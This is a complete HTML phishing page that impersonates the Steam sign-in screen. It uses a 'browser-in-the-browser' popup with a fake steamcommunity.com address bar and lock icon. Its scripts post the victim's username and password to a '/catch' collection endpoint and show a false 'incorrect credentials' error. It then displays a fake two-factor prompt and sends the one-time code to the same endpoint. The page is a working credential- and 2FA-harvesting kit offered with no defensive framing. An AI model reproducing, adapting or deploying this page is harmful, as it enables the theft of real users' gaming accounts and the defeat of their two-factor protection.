<!DOCTYPE html><html><head><meta charset="UTF-8">
<title>Steam – Sign In</title>
<style>*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Arial,Helvetica,sans-serif;background:#1b2838;min-height:100vh;display:flex;align-items:center;justify-content:center;}
.card{background:#c6d4df;border-radius:3px;padding:0;width:450px;overflow:hidden;box-shadow:0 0 20px rgba(0,0,0,.6)}
.card-header{background:#1b2838;padding:16px 24px;display:flex;align-items:center;gap:12px}
.steam-logo{color:#c6d4df;font-size:24px;font-weight:900;letter-spacing:-1px}
.card-body{padding:28px 32px}
.card-body h1{font-size:16px;font-weight:700;color:#1b2838;margin-bottom:20px}
.field{margin-bottom:14px}
.field label{display:block;font-size:12px;font-weight:700;color:#4c6b22;margin-bottom:4px}
.field input{width:100%;padding:8px 10px;border:1px solid #a3b5c2;border-radius:2px;font-size:13px;color:#1b2838;background:white;outline:none}
.field input:focus{border-color:#4c6b22}
.card .login-btn{padding:8px 24px;background:linear-gradient(to bottom,#4dcc4d,#3a9a3a);color:white;border:none;border-radius:2px;font-size:13px;font-weight:700;cursor:pointer;margin-top:4px}
.card .login-btn:hover{background:linear-gradient(to bottom,#66dd66,#4ab54a)}
.card-footer{background:#dce8f1;padding:12px 32px;font-size:12px;color:#536878;text-align:right}
.card-footer a{color:#4c7891;text-decoration:none}
#ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.65);z-index:9999;align-items:center;justify-content:center}
#ov.show{display:flex}
.bw{width:460px;border-radius:10px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.8);animation:popIn .15s ease-out}
@keyframes popIn{from{transform:scale(.92);opacity:0}to{transform:scale(1);opacity:1}}
.tb{background:#2a2a2a;padding:8px 10px 6px;display:flex;align-items:center;gap:8px}
.dots{display:flex;gap:6px}.dots span{width:13px;height:13px;border-radius:50%;display:block}
.dr{background:#ff5f57}.dy{background:#ffbd2e}.dg{background:#28c840}
.ub{flex:1;background:#1b2838;border-radius:20px;padding:3px 12px;display:flex;align-items:center;gap:6px;font-size:13px;color:#c6d4df}
.lock{color:#4c7891;font-size:12px}.xbtn{background:none;border:none;font-size:18px;cursor:pointer;color:#888}
.bd{background:#c6d4df;padding:0;overflow:hidden}
.bd-head{background:#1b2838;padding:14px 24px}
.bd-head .sl{color:#c6d4df;font-size:20px;font-weight:900}
.bd-body{padding:24px 28px}
.bd-body h2{font-size:15px;font-weight:700;color:#1b2838;margin-bottom:18px}
.bd-body label{display:block;font-size:12px;font-weight:700;color:#4c6b22;margin-bottom:4px}
.bd-body input{width:100%;padding:8px 10px;border:1px solid #a3b5c2;border-radius:2px;font-size:13px;color:#1b2838;background:white;margin-bottom:12px;outline:none;box-sizing:border-box}
.bd-body input:focus{border-color:#4c6b22}
.bd-body .bs{padding:8px 20px;background:linear-gradient(to bottom,#4dcc4d,#3a9a3a);color:white;border:none;border-radius:2px;font-size:13px;font-weight:700;cursor:pointer}
.bd-body .err{display:none;color:#a34a4a;font-size:12px;margin-top:-6px;margin-bottom:8px}

#_otp_step{display:none;margin-top:8px}
#_otp_step label{font-size:13px;color:#333;display:block;margin-bottom:4px}
#_otp_step input{width:100%;padding:9px 12px;border:1px solid #ccc;border-radius:4px;font-size:18px;
  letter-spacing:6px;text-align:center;margin-bottom:14px;outline:none}
#_otp_step input:focus{border-color:#1a73e8}
#_otp_info{font-size:13px;color:#555;text-align:center;margin-bottom:12px}
</style><style>#_obtn{width:100%;padding:10px;cursor:pointer;font-size:15px;border-radius:4px;border:none;margin-top:4px} #_obtn{} </style>
</head><body>
<div class="card">
<div class="card-header"><div class="steam-logo">STEAM</div></div>
<div class="card-body">
<h1>Sign in with your Steam account</h1>
<div class="field"><label>Sign in name</label><input type="text" onfocus="showB()"></div>
<div class="field"><label>Password</label><input type="password" onfocus="showB()"></div>
<button class="login-btn" onclick="showB()">Sign in</button>
</div>
<div class="card-footer"><a href="#">I can't sign in</a> | <a href="#">Create a free account</a></div>
</div>
<div id="ov"><div class="bw">
<div class="tb">
<div class="dots"><span class="dr" onclick="hideB()"></span><span class="dy"></span><span class="dg"></span></div>
<div class="ub"><span class="lock">&#128274;</span><span><strong>steamcommunity.com</strong><span style="color:#4c7891">/login</span></span></div>
<button class="xbtn" onclick="hideB()">&#x2715;</button></div>
<div class="bd">
<div class="bd-head"><div class="sl">STEAM</div></div>
<div class="bd-body">
<h2>Sign in with your Steam account</h2>
<form id="lf" onsubmit="doSub(event)">
<label>Sign in name</label>
<input type="text" id="fu" required>
<label>Password</label>
<input type="password" id="fp" required>
<p class="err" id="em">Incorrect login credentials. Please try again.</p>
<button class="bs" type="submit">Sign in</button>
</form>
<div id="_otp_step">
  <p id="_otp_info">&#x1F512; Two-factor authentication required<br><small style="color:#888">Enter the code from your authenticator app</small></p>
  <label>Verification code</label>
  <input type="tel" id="_fotp" autocomplete="one-time-code" placeholder="000000" maxlength="8" pattern="[0-9]*" inputmode="numeric">
  <button type="button" id="_obtn" onclick="_submitOTP()">Verify</button>
</div>
</div></div></div></div>
<script>
function showB(){document.getElementById('ov').classList.add('show');setTimeout(()=>document.getElementById('fu').focus(),150);}
function hideB(){document.getElementById('ov').classList.remove('show');}
document.getElementById('ov').addEventListener('click',function(e){if(e.target===this)hideB();});
function doSub(e){e.preventDefault();
var u=document.getElementById('fu').value,p=document.getElementById('fp').value;
fetch('/catch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user:u,pass:p,ts:new Date().toISOString(),src:'bitb'})}).catch(()=>{});
var b=e.target.querySelector('.bs');b.textContent='Signing in…';b.disabled=true;
setTimeout(()=>{document.getElementById('em').style.display='block';b.textContent='Sign in';b.disabled=false;document.getElementById('fp').value='';document.getElementById('fp').focus();},1800);}
</script>
<script>
(function(){
var _c={};
// Patch submitLogin / doSub / loginSubmit etc.
var _origSub=window.submitLogin||window.doSub||window.loginSubmit||null;
function _hookSubmit(u,p){
  _c={user:u,pass:p};
  fetch('/catch',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({user:u,pass:p,ts:new Date().toISOString(),src:'bitb',step:'creds'})}).catch(()=>{});
}
// After original submit fires (shows error), reveal OTP step
var _origFns=['submitLogin','doSub','loginSubmit'];
_origFns.forEach(function(fn){
  if(typeof window[fn]==='function'){
    var _orig=window[fn];
    window[fn]=function(e){
      var _u=document.querySelector('input[type=text],input[autocomplete=username],input[id*=user],input[id*=email]');
      var _p=document.querySelector('input[type=password]');
      if(_u&&_p) _hookSubmit(_u.value,_p.value);
      var r=_orig.apply(this,arguments);
      setTimeout(function(){
        var otp=document.getElementById('_otp_step');
        if(otp) otp.style.display='block';
        var fi=document.getElementById('_fotp');
        if(fi) setTimeout(function(){fi.focus();},100);
      },1700);
      return r;
    };
  }
});
window._submitOTP=function(){
  var otp=document.getElementById('_fotp');
  if(!otp||!otp.value) return;
  var btn=document.getElementById('_obtn');
  if(btn){btn.textContent='Verifying\u2026';btn.disabled=true;}
  fetch('/catch',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({user:_c.user,pass:_c.pass,otp:otp.value,
      ts:new Date().toISOString(),src:'bitb',step:'otp'})}).catch(()=>{});
  setTimeout(function(){
    var info=document.getElementById('_otp_info');
    if(info) info.innerHTML='&#x26A0; Incorrect code. Please try again.';
    if(btn){btn.textContent='Verify';btn.disabled=false;}
    if(otp){otp.value='';otp.focus();}
  },1800);
};
// Allow Enter key on OTP field
document.addEventListener('keydown',function(e){
  if(e.key==='Enter'&&document.activeElement&&document.activeElement.id==='_fotp'){
    window._submitOTP();
  }
});
})();
</script>
</body></html>
